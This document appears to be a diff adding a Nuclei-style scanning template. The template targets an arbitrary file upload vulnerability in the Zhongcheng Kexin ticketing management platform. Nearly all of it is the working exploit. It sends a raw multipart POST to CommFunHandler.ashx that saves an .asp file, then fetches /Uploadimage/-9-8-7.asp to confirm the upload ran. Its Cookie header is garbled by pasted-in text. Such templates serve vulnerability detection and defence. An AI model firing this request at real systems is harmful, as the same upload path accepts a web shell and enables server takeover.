@@ -1,0 +1,75 @@
+id: zckx-CommFunHandler-upload
+info:
+  name: zckx-CommFunHandler-upload
+  author: apple
+  severity: critical
+  description: 中成科信票务管理平台任意文件上传漏洞
+    - https://github.com/wy876/POC/blob/main/%E4%B8%AD%E6%88%90%E7%A7%91%E4%BF%A1%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+  
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  
+http:
+  - raw:
+      - |-
+        POST /SystemManager/Comm/CommFunHandler.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: https://fofa.info/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET Core | Open-source web framework for .NET_SessionId=zaiwm34v0gxjfsfcjx3zvw5u
+        Connection: close
+        Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
+        Content-Length: 864
+
+
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: image/jpeg
+
+        who is zhangsan
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="fileName"
+
+        {{filename}}.asp
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="Method"
+
+        UploadZoneImg
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="solutionNo"
+
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="siteNo"
+
+        9
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="showNo"
+
+        8
+        ----------------------------354575237365372692397370
+        Content-Disposition: form-data; name="showingNo"
+
+        7
+        ----------------------------354575237365372692397370--
+      - |+
+        GET /Uploadimage/-9-8-7.asp HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - who is zhangsan
